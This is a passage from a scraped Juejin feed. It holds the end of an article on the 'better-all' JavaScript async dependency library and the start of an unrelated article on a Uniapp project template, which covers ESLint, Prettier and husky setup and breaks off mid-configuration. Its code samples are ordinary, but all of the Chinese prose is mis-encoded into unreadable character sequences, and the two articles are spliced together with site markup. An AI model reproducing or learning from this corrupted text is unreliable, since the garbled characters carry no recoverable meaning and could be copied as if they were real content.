Â Â Â Â <span class="hljs-keyword">return</span>Â <span class="hljs-title function_">fetchSettings</span>((<span class="hljs-keyword">await</span>Â <span class="hljs-variable language_">this</span>.<span class="hljs-property">$</span>.<span class="hljs-property">user</span>).<span class="hljs-property">id</span>)
Â Â },
})

<span class="hljs-comment">//Â userÂ ä»»åŠ¡é¦–å…ˆè¿è¡Œï¼Œç„¶åÂ profileÂ å’ŒÂ settingsÂ ä»»åŠ¡å¹¶è¡Œè¿è¡Œ</span>
</code></pre>
<p><strong>å¤æ‚çš„ä¾èµ–å›¾ï¼š</strong></p>
<pre><code class="hljs language-tsx" lang="tsx"> <span class="hljs-keyword">const</span>Â {Â a,Â b,Â c,Â d,Â eÂ }Â =Â <span class="hljs-keyword">await</span>Â <span class="hljs-title function_">all</span>({
Â Â <span class="hljs-keyword">async</span>Â <span class="hljs-title function_">a</span>(<span class="hljs-params"/>)Â {
Â Â Â Â <span class="hljs-keyword">return</span>Â <span class="hljs-number">1</span>
Â Â },
Â Â <span class="hljs-keyword">async</span>Â <span class="hljs-title function_">b</span>(<span class="hljs-params"/>)Â {
Â Â Â Â <span class="hljs-keyword">return</span>Â <span class="hljs-number">2</span>
Â Â },
Â Â <span class="hljs-keyword">async</span>Â <span class="hljs-title function_">c</span>(<span class="hljs-params"/>)Â {
Â Â Â Â <span class="hljs-keyword">return</span>Â (<span class="hljs-keyword">await</span>Â <span class="hljs-variable language_">this</span>.<span class="hljs-property">$</span>.<span class="hljs-property">a</span>)Â +Â <span class="hljs-number">10</span>
Â Â },
Â Â <span class="hljs-keyword">async</span>Â <span class="hljs-title function_">d</span>(<span class="hljs-params"/>)Â {
Â Â Â Â <span class="hljs-keyword">return</span>Â (<span class="hljs-keyword">await</span>Â <span class="hljs-variable language_">this</span>.<span class="hljs-property">$</span>.<span class="hljs-property">b</span>)Â +Â <span class="hljs-number">20</span>
Â Â },
Â Â <span class="hljs-keyword">async</span>Â <span class="hljs-title function_">e</span>(<span class="hljs-params"/>)Â {
Â Â Â Â <span class="hljs-keyword">return</span>Â (<span class="hljs-keyword">await</span>Â <span class="hljs-variable language_">this</span>.<span class="hljs-property">$</span>.<span class="hljs-property">c</span>)Â +Â (<span class="hljs-keyword">await</span>Â <span class="hljs-variable language_">this</span>.<span class="hljs-property">$</span>.<span class="hljs-property">d</span>)
Â Â },
})

<span class="hljs-comment">//Â aÂ å’ŒÂ bÂ å¹¶è¡Œè¿è¡Œ</span>
<span class="hljs-comment">//Â cÂ ç­‰å¾…Â aï¼ŒdÂ ç­‰å¾…Â bÂ (cÂ å’ŒÂ dÂ å¯ä»¥é‡å å¹¶è¡Œ)</span>
<span class="hljs-comment">//Â eÂ ç­‰å¾…Â cÂ å’ŒÂ dÂ éƒ½å®Œæˆ</span>

<span class="hljs-comment">//Â ç»“æœ:Â {Â a:Â 1,Â b:Â 2,Â c:Â 11,Â d:Â 22,Â e:Â 33Â }</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>({Â a,Â b,Â c,Â d,Â eÂ })
</code></pre>
<h2 data-id="heading-6">æ ¸å¿ƒå®ç°æœºåˆ¶ï¼šProxyä¸æ™ºèƒ½è°ƒåº¦</h2>
<p><code>better-all</code>ä¹‹æ‰€ä»¥èƒ½å®ç°å¦‚æ­¤ä¼˜é›…çš„ä¾èµ–ç®¡ç†ï¼Œå…¶å†…éƒ¨æœºåˆ¶ä¸»è¦ä¾èµ–äºJavaScriptçš„<code>Proxy</code>å¯¹è±¡å’Œä¸€å¥—ç²¾å·§çš„Promiseå»¶è¿Ÿè§£å†³ï¼ˆDeferred Resolutionï¼‰é€»è¾‘ã€‚</p>
<h3 data-id="heading-7">1. <code>this.$</code>çš„Proxyä»£ç†</h3>
<p><code>better-all</code>ä¸ºæ¯ä¸ªä»»åŠ¡å‡½æ•°æä¾›äº†ä¸€ä¸ªç‰¹æ®Šçš„<code>this.$</code>ä¸Šä¸‹æ–‡ã€‚è¿™ä¸ª<code>$</code>å¯¹è±¡å®é™…ä¸Šæ˜¯ä¸€ä¸ª<code>Proxy</code>ã€‚å½“ä½ åœ¨ä»»åŠ¡å‡½æ•°ä¸­é€šè¿‡<code>await this.$.dependencyName</code>è®¿é—®æŸä¸ªä¾èµ–æ—¶ï¼Œ<code>Proxy</code>ä¼šæ‹¦æˆªè¿™ä¸ªè®¿é—®ã€‚</p>
<h3 data-id="heading-8">2. æ™ºèƒ½ç­‰å¾…æœºåˆ¶</h3>
<p>å½“<code>Proxy</code>æ‹¦æˆªåˆ°å¯¹<code>this.$.dependencyName</code>çš„è®¿é—®æ—¶ï¼Œå®ƒä¼šæ£€æŸ¥<code>dependencyName</code>å¯¹åº”çš„ä»»åŠ¡æ˜¯å¦å·²ç»å®Œæˆã€‚å¦‚æœå·²å®Œæˆï¼Œå®ƒä¼šç«‹å³è¿”å›ç»“æœï¼›å¦‚æœå°šæœªå®Œæˆï¼Œå®ƒä¼šåˆ›å»ºä¸€ä¸ªæ–°çš„Promiseï¼Œå¹¶å°†å½“å‰ä»»åŠ¡çš„<code>resolve</code>å’Œ<code>reject</code>å‡½æ•°æ³¨å†Œåˆ°<code>dependencyName</code>ä»»åŠ¡çš„ç­‰å¾…é˜Ÿåˆ—ä¸­ã€‚</p>
<h3 data-id="heading-9">3. ä»»åŠ¡çš„å¹¶è¡Œå¯åŠ¨ä¸ç»“æœç®¡ç†</h3>
<p><code>better-all</code>åœ¨å¼€å§‹æ—¶ä¼šç«‹å³å¯åŠ¨æ‰€æœ‰å®šä¹‰çš„å¼‚æ­¥ä»»åŠ¡ã€‚æ¯ä¸ªä»»åŠ¡çš„ç»“æœï¼ˆæ— è®ºæ˜¯æˆåŠŸè§£å†³è¿˜æ˜¯å¤±è´¥æ‹’ç»ï¼‰éƒ½ä¼šè¢«å­˜å‚¨èµ·æ¥ã€‚å½“ä¸€ä¸ªä»»åŠ¡å®Œæˆæ—¶ï¼Œå®ƒä¼šéå†æ‰€æœ‰ç­‰å¾…å®ƒçš„ä¾èµ–ä»»åŠ¡ï¼Œå¹¶è§¦å‘å®ƒä»¬çš„<code>resolve</code>æˆ–<code>reject</code>å‡½æ•°ï¼Œä»è€Œè§£é™¤è¿™äº›ä¾èµ–ä»»åŠ¡çš„é˜»å¡ã€‚</p>
<h3 data-id="heading-10">4. å¼ºå¤§çš„ç±»å‹æ¨æ–­</h3>
<p>å¾—ç›ŠäºTypeScriptçš„å¼ºå¤§èƒ½åŠ›ï¼Œ<code>better-all</code>åœ¨è®¾è®¡æ—¶å……åˆ†åˆ©ç”¨äº†æ³›å‹å’Œ<code>Awaited&lt;R&gt;</code>ç­‰é«˜çº§ç±»å‹ç‰¹æ€§ã€‚è¿™æ„å‘³ç€ï¼Œæ— è®ºä½ å®šä¹‰äº†å¤šä¹ˆå¤æ‚çš„ä»»åŠ¡å’Œä¾èµ–å…³ç³»ï¼Œ<code>this.$.dependencyName</code>éƒ½èƒ½æä¾›ç²¾ç¡®çš„ç±»å‹ä¿¡æ¯ï¼Œå¹¶ä¸”æœ€ç»ˆè¿”å›çš„ç»“æœå¯¹è±¡ä¹Ÿæ˜¯å®Œå…¨ç±»å‹å®‰å…¨çš„ï¼Œæå¤§åœ°æå‡äº†å¼€å‘ä½“éªŒå’Œä»£ç å¥å£®æ€§ã€‚</p>
<h2 data-id="heading-11">better-all çš„ä¼˜åŠ¿æ€»ç»“</h2>
<ul>
<li>â€¢ <strong>è‡ªåŠ¨æœ€å¤§åŒ–å¹¶è¡Œåº¦</strong>ï¼šæ— éœ€æ‰‹åŠ¨åˆ†æå’Œä¼˜åŒ–ä¾èµ–å›¾ï¼Œåº“ä¼šè‡ªåŠ¨å¤„ç†ï¼Œç¡®ä¿ä»»åŠ¡åœ¨æ»¡è¶³ä¾èµ–çš„å‰æä¸‹å°½å¯èƒ½å¹¶è¡Œæ‰§è¡Œã€‚</li>
<li>â€¢ <strong>æä½³çš„å¯è¯»æ€§</strong>ï¼šé€šè¿‡<code>await this.$.dependency</code>çš„è¯­æ³•ï¼Œä»¥æœ€ç›´è§‚çš„æ–¹å¼è¡¨è¾¾ä»»åŠ¡ä¾èµ–ï¼Œä»£ç é€»è¾‘æ¸…æ™°æ˜äº†ã€‚</li>
<li>â€¢ <strong>å…¨æ–¹ä½ç±»å‹å®‰å…¨</strong>ï¼šå€ŸåŠ©TypeScriptï¼Œä»ä»»åŠ¡å®šä¹‰åˆ°ç»“æœè·å–ï¼Œå…¨ç¨‹æä¾›ç²¾ç¡®çš„ç±»å‹æ¨æ–­ï¼Œæœ‰æ•ˆé¿å…æ½œåœ¨çš„ç±»å‹é”™è¯¯ã€‚</li>
<li>â€¢ <strong>è½»é‡çº§</strong>ï¼šåº“æœ¬èº«ä¾èµ–å°‘ï¼Œæ‰“åŒ…ä½“ç§¯å°ï¼Œå¯¹é¡¹ç›®æ€§èƒ½å½±å“å¾®ä¹å…¶å¾®ã€‚</li>
<li>â€¢ <strong>é”™è¯¯å¤„ç†</strong>ï¼šé”™è¯¯ä¼ æ’­æœºåˆ¶ä¸<code>Promise.all</code>ç±»ä¼¼ï¼Œä¸€ä¸ªä»»åŠ¡å¤±è´¥ä¼šå¯¼è‡´ä¾èµ–å®ƒçš„ä»»åŠ¡ä¹Ÿå¤±è´¥ï¼Œå¹¶é€šè¿‡<code>try...catch</code>æ•è·ã€‚</li>
</ul>
<h2 data-id="heading-12">é€‚ç”¨åœºæ™¯ä¸ä½¿ç”¨å»ºè®®</h2>
<h3 data-id="heading-13">âœ… é€‚åˆä½¿ç”¨çš„åœºæ™¯</h3>
<p><code>better-all</code>ç‰¹åˆ«é€‚ç”¨äºä»¥ä¸‹åœºæ™¯ï¼š</p>
<ul>
<li><strong>æ•°æ®èšåˆ</strong>ï¼šéœ€è¦ä»å¤šä¸ªAPIæˆ–æ•°æ®åº“ä¸­è·å–æ•°æ®ï¼Œä¸”éƒ¨åˆ†æ•°æ®è·å–å­˜åœ¨å‰åä¾èµ–ã€‚</li>
<li><strong>å¤æ‚è®¡ç®—æµ</strong>ï¼šä¸€ç³»åˆ—è®¡ç®—æ­¥éª¤ï¼Œå…¶ä¸­æŸäº›æ­¥éª¤çš„ç»“æœæ˜¯åç»­æ­¥éª¤çš„è¾“å…¥ã€‚</li>
<li><strong>æ„å»ºæµç¨‹</strong>ï¼šä¾‹å¦‚åœ¨æ„å»ºç³»ç»Ÿä¸­ï¼ŒæŸäº›æ¨¡å—çš„ç¼–è¯‘ä¾èµ–äºå…¶ä»–æ¨¡å—çš„è¾“å‡ºã€‚</li>
</ul>
<h3 data-id="heading-14">âš ï¸ ä¸é€‚åˆä½¿ç”¨çš„åœºæ™¯</h3>
<ul>
<li><strong>ä»»åŠ¡å®Œå…¨ç‹¬ç«‹</strong>ï¼šå¦‚æœæ‰€æœ‰ä»»åŠ¡éƒ½æ˜¯ç‹¬ç«‹çš„ï¼Œç›´æ¥ä½¿ç”¨ <code>Promise.all</code> æ›´ç®€å•ã€‚</li>
<li><strong>åŠ¨æ€ä¾èµ–</strong>ï¼šå¦‚æœä¾èµ–å…³ç³»åªèƒ½åœ¨è¿è¡Œæ—¶ç¡®å®šï¼Œ<code>better-all</code> çš„é™æ€ä¾èµ–å£°æ˜æ–¹å¼å¯èƒ½ä¸é€‚ç”¨ã€‚</li>
<li><strong>éœ€è¦ç²¾ç»†æ§åˆ¶å¹¶å‘æ•°</strong>ï¼šå¦‚æœéœ€è¦é™åˆ¶åŒæ—¶æ‰§è¡Œçš„ä»»åŠ¡æ•°é‡ï¼Œå¯èƒ½éœ€è¦é…åˆå…¶ä»–åº“å¦‚ <code>p-limit</code>ã€‚</li>
</ul>
<h3 data-id="heading-15">ğŸ’¡ æœ€ä½³å®è·µ</h3>
<pre><code class="hljs language-tsx" lang="tsx"><span class="hljs-comment">//Â âœ…Â æ¨èï¼šæ¸…æ™°çš„ä»»åŠ¡å‘½å</span>
<span class="hljs-keyword">const</span>Â resultÂ =Â <span class="hljs-keyword">await</span>Â <span class="hljs-title function_">all</span>({
Â Â <span class="hljs-keyword">async</span>Â <span class="hljs-title function_">userData</span>(<span class="hljs-params"/>)Â {
Â Â Â Â <span class="hljs-keyword">return</span>Â <span class="hljs-title function_">fetchUser</span>(userId)
Â Â },
Â Â <span class="hljs-keyword">async</span>Â <span class="hljs-title function_">userProfile</span>(<span class="hljs-params"/>)Â {
Â Â Â Â <span class="hljs-keyword">const</span>Â userÂ =Â <span class="hljs-keyword">await</span>Â <span class="hljs-variable language_">this</span>.<span class="hljs-property">$</span>.<span class="hljs-property">userData</span>
Â Â Â Â <span class="hljs-keyword">return</span>Â <span class="hljs-title function_">fetchProfile</span>(user.<span class="hljs-property">id</span>)
Â Â }
})

<span class="hljs-comment">//Â âŒÂ é¿å…ï¼šè¿‡åº¦å¤æ‚çš„ä¾èµ–å›¾ï¼ˆè¶…è¿‡3å±‚ï¼‰</span>
<span class="hljs-comment">//Â å¦‚æœä¾èµ–å±‚çº§å¤ªæ·±ï¼Œè€ƒè™‘æ‹†åˆ†æˆ–é‡æ„</span>
</code></pre>
<h2 data-id="heading-16">ç»“è¯­</h2>
<p><code>better-all</code>æä¾›äº†ä¸€ç§æ›´é«˜çº§ã€æ›´æ™ºèƒ½çš„å¼‚æ­¥ä»»åŠ¡ç¼–æ’æ–¹å¼ï¼Œå®ƒå°†å¼€å‘è€…ä»ç¹ççš„ä¾èµ–ç®¡ç†ä¸­è§£æ”¾å‡ºæ¥ï¼Œè®©æˆ‘ä»¬èƒ½å¤Ÿæ›´ä¸“æ³¨äºä¸šåŠ¡é€»è¾‘æœ¬èº«ã€‚åœ¨è¿½æ±‚é«˜æ€§èƒ½å’Œé«˜å¯ç»´æŠ¤æ€§çš„ç°ä»£å‰ç«¯å¼€å‘ä¸­ï¼Œ<code>better-all</code>æ— ç–‘æ˜¯ä¸€ä¸ªå€¼å¾—å…³æ³¨å’Œå°è¯•çš„ä¼˜ç§€å·¥å…·ã€‚å®ƒä¸ä»…æå‡äº†å¼€å‘æ•ˆç‡ï¼Œä¹Ÿè®©æˆ‘ä»¬çš„å¼‚æ­¥ä»£ç æ›´åŠ å¥å£®å’Œä¼˜é›…ã€‚</p>
<p>è®°ä½ï¼š<strong>å¥½çš„å·¥å…·ä¸æ˜¯è®©ç®€å•çš„äº‹æƒ…å˜å¤æ‚ï¼Œè€Œæ˜¯è®©å¤æ‚çš„äº‹æƒ…å˜ç®€å•ã€‚</strong></p>
<hr/>
<blockquote>
<p><strong>ğŸ’¡ React Hooks å·¥å…·åº“æ¨è</strong> &gt; <strong>@reactuses/core</strong> - 100+ ä¸ªç”Ÿäº§çº§ Hooksï¼Œè¦†ç›–çŠ¶æ€ã€å‰¯ä½œç”¨ã€æµè§ˆå™¨ API ç­‰åœºæ™¯ &gt; ğŸ“– <a href="https://link.juejin.cn?target=https%3A%2F%2Freactuse.com%2F" target="_blank" title="https://reactuse.com/" ref="nofollow noopener noreferrer">reactuse.com</a> | ğŸ“¦ <code>npm i @reactuses/core</code></p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ä»é›¶æ­å»º Uniapp ä¼ä¸šçº§é¡¹ç›®æ¨¡æ¿]]></title>    <link>https://juejin.cn/post/7592882393251201067</link>    <guid>https://juejin.cn/post/7592882393251201067</guid>    <pubDate>2026-01-09T03:25:25.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592882393251201067" data-draft-id="7592882393251168299" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ä»é›¶æ­å»º Uniapp ä¼ä¸šçº§é¡¹ç›®æ¨¡æ¿"/> <meta itemprop="keywords" content="å‰ç«¯"/> <meta itemprop="datePublished" content="2026-01-09T03:25:25.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å€Ÿä¸ªç«er"/> <meta itemprop="url" content="https://juejin.cn/user/2225067265915783"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ä»é›¶æ­å»º Uniapp ä¼ä¸šçº§é¡¹ç›®æ¨¡æ¿
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2225067265915783/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å€Ÿä¸ªç«er
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-09T03:25:25.000Z" title="Fri Jan 09 2026 03:25:25 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">ä»é›¶æ­å»º Uniapp ä¼ä¸šçº§é¡¹ç›®æ¨¡æ¿</h2>
<blockquote>
<p>ä¸€å¥—å¼€ç®±å³ç”¨çš„ Uniapp é¡¹ç›®æ¨¡æ¿ï¼ŒåŒ…å«è¯·æ±‚å°è£…ã€Token ç®¡ç†ã€å¤šç¯å¢ƒåˆ‡æ¢ã€å·¥ç¨‹åŒ–é…ç½®ç­‰ä¼ä¸šçº§åŠŸèƒ½ã€‚</p>
</blockquote>
<h3 data-id="heading-1">å‰è¨€</h3>
<p>æ¯æ¬¡æ–°å»º Uniapp é¡¹ç›®ï¼Œéƒ½è¦é‡å¤é…ç½® ESLintã€å°è£…è¯·æ±‚ã€å¤„ç† Token... äºæ˜¯æ•´ç†äº†ä¸€å¥—æ¨¡æ¿ï¼ŒæŠŠå¸¸ç”¨åŠŸèƒ½éƒ½å°è£…å¥½ï¼Œæ–°é¡¹ç›®ç›´æ¥ç”¨ã€‚</p>
<p>è¿™ç¯‡æ–‡ç« åˆ†äº«æ¨¡æ¿çš„æ•´ä½“è®¾è®¡å’Œæ­å»ºè¿‡ç¨‹ã€‚</p>
<hr/>
<h3 data-id="heading-2">ä¸€ã€é¡¹ç›®ç»“æ„</h3>
<pre><code class="hljs language-bash" lang="bash">uniapp-template/
â”œâ”€â”€ src/
â”‚   â”œâ”€â”€ api/                <span class="hljs-comment"># æ¥å£å±‚</span>
â”‚   â”‚   â”œâ”€â”€ core/           <span class="hljs-comment"># è¯·æ±‚æ ¸å¿ƒ</span>
â”‚   â”‚   â”‚   â”œâ”€â”€ request.js  <span class="hljs-comment"># è¯·æ±‚å°è£…</span>
â”‚   â”‚   â”‚   â””â”€â”€ interceptors.js
â”‚   â”‚   â””â”€â”€ user.js         <span class="hljs-comment"># ä¸šåŠ¡æ¥å£ç¤ºä¾‹</span>
â”‚   â”œâ”€â”€ auth/               <span class="hljs-comment"># è®¤è¯æ¨¡å—</span>
â”‚   â”‚   â””â”€â”€ tokenManager.js
â”‚   â”œâ”€â”€ config/             <span class="hljs-comment"># é…ç½®</span>
â”‚   â”‚   â””â”€â”€ token.js
â”‚   â”œâ”€â”€ utils/              <span class="hljs-comment"># å·¥å…·å‡½æ•°</span>
â”‚   â”‚   â”œâ”€â”€ env.js          <span class="hljs-comment"># ç¯å¢ƒç®¡ç†</span>
â”‚   â”‚   â””â”€â”€ cache.js        <span class="hljs-comment"># é¡µé¢ç¼“å­˜</span>
â”‚   â”œâ”€â”€ components/         <span class="hljs-comment"># é€šç”¨ç»„ä»¶</span>
â”‚   â”œâ”€â”€ pages/              <span class="hljs-comment"># é¡µé¢</span>
â”‚   â”œâ”€â”€ store/              <span class="hljs-comment"># çŠ¶æ€ç®¡ç†</span>
â”‚   â”œâ”€â”€ styles/             <span class="hljs-comment"># å…¨å±€æ ·å¼</span>
â”‚   â”‚   â””â”€â”€ variables.scss
â”‚   â”œâ”€â”€ App.vue
â”‚   â”œâ”€â”€ main.js
â”‚   â”œâ”€â”€ pages.json
â”‚   â””â”€â”€ manifest.json
â”œâ”€â”€ docs/                   <span class="hljs-comment"># é¡¹ç›®æ–‡æ¡£</span>
â”œâ”€â”€ .husky/                 <span class="hljs-comment"># Git Hooks</span>
â”œâ”€â”€ .<span class="hljs-built_in">env</span>                    <span class="hljs-comment"># ç¯å¢ƒå˜é‡</span>
â”œâ”€â”€ .prettierrc
â”œâ”€â”€ .cz-config.js           <span class="hljs-comment"># æäº¤è§„èŒƒé…ç½®</span>
â”œâ”€â”€ commitlint.config.js
â”œâ”€â”€ eslint.config.js
â”œâ”€â”€ package.json
â””â”€â”€ vite.config.js
</code></pre>
<hr/>
<h3 data-id="heading-3">äºŒã€å·¥ç¨‹åŒ–é…ç½®</h3>
<h4 data-id="heading-4">2.1 ESLint + Prettier</h4>
<p>ç»Ÿä¸€ä»£ç é£æ ¼ï¼Œé¿å…å›¢é˜Ÿåä½œæ—¶çš„æ ¼å¼å†²çªã€‚</p>
<pre><code class="hljs language-bash" lang="bash">pnpm add -D eslint eslint-plugin-vue eslint-config-prettier eslint-plugin-prettier prettier vue-eslint-parser
</code></pre>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// eslint.config.js</span>
<span class="hljs-keyword">import</span> vue <span class="hljs-keyword">from</span> <span class="hljs-string">'eslint-plugin-vue'</span>;
<span class="hljs-keyword">import</span> prettierConfig <span class="hljs-keyword">from</span> <span class="hljs-string">'eslint-config-prettier'</span>;
<span class="hljs-keyword">import</span> prettierPlugin <span class="hljs-keyword">from</span> <span class="hljs-string">'eslint-plugin-prettier'</span>;

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> [
  ...vue.<span class="hljs-property">configs</span>[<span class="hljs-string">'flat/strongly-recommended'</span>],
  prettierConfig,
  {
    <span class="hljs-attr">plugins</span>: { <span class="hljs-attr">prettier</span>: prettierPlugin },
    <span class="hljs-attr">rules</span>: { <span class="hljs-string">'prettier/prettier'</span>: <span class="hljs-string">'error'</span> },
  },
  {
    <span class="hljs-attr">languageOptions</span>: {
      <span class="hljs-attr">globals</span>: { <span class="hljs-attr">uni</span>: <span class="hljs-string">'readonly'</span>, <span class="hljs-attr">getCurrentPages</span>: <span class="hljs-string">'readonly'</span> },
    },
    <span class="hljs-attr">rules</span>: {
      <span class="hljs-string">'vue/multi-word-component-names'</span>: <span class="hljs-string">'off'</span>,
      <span class="hljs-string">'no-console'</span>: <span class="hljs-string">'warn'</span>,
      <span class="hljs-string">'eqeqeq'</span>: [<span class="hljs-string">'error'</span>, <span class="hljs-string">'always'</span>],
    },
  },
];
</code></pre>
<pre><code class="hljs language-json" lang="json"><span class="hljs-comment">// .prettierrc</span>
<span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"semi"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"singleQuote"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"printWidth"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">100</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"tabWidth"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">2</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"trailingComma"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"es5"</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<h4 data-id="heading-5">2.2 Husky + lint-staged</h4>
<p>æäº¤å‰è‡ªåŠ¨æ£€æŸ¥ä»£ç ï¼Œåªæ£€æŸ¥æš‚å­˜çš„æ–‡ä»¶ã€‚</p>
<pre><code class="hljs language-bash" lang="bash">pnpm add -D husky lint-staged
npx husky init
</code></pre>
<pre><code class="hljs language-json" lang="json"><span class="hljs-comment">// package.json</span>
<span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"lint-staged"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
